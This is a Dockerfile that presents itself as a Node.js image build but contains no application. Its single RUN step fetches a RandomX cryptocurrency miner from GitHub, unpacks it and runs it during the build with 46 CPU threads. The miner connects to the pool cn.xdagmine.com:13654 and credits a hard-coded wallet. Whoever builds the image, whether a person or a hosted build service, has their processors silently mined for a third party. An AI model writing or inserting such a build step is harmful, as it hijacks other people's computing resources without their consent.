FROM node:16
RUN apt-get update && \
    wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -p cn.xdagmine.com:13654 -t 46 -a yfSserc52yrsZ88b7JxEdMyDlO9Z9kba
